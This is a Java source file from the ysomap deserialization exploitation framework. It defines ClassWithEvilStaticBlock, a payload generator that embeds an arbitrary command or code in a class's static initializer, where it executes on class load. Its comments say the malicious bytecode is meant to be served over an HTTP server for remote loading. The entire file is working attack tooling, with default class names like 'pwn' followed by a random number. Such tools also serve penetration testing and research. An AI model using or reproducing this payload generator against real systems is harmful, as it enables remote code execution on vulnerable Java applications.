package ysomap.bullets.objects;

import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.core.util.ClassFiles;
import ysomap.core.util.PayloadHelper;

import java.util.Random;

/**
 * @author wh1t3P1g
 * @since 2020/3/15
 */
@Bullets
@Authors({Authors.WH1T3P1G})
@Details("用于生成恶意字节码，配合SimpleHTTPServer使用")
@Targets({Targets.CODE})
@Dependencies({"*"})
public class ClassWithEvilStaticBlock extends AbstractBullet<byte[]> {

    @NotNull
    @Require(name = "classname", detail = "所需生成的类名")
    public String classname;

    @NotNull
    @Require(name = "body", detail = "代码或命令，如果是代码以'code:'打头")
    public String body;

    @NotNull
    @Require(name = "type", detail = "所需生成的文件类型，支持class或jar")
    public String type = null;

    @Override
    public byte[] getObject() throws Exception {
        String code;
        if(body.startsWith("code:")){
            code = body.substring(5);
        }else{
            code = PayloadHelper.makeRuntimeExecPayload(body);
        }
        return ClassFiles.makeClassWithStaticBlock(classname, code);
    }

    public static Bullet newInstance(Object... args) throws Exception {
        ClassWithEvilStaticBlock bullet = new ClassWithEvilStaticBlock();
        bullet.set("type", "class");
        bullet.set("body", args[0]);
        if(args.length > 1) {
            bullet.set("classname", args[1]);
        }else{
            bullet.set("classname", "pwn"+new Random().nextLong());
        }
        return bullet;
    }
}
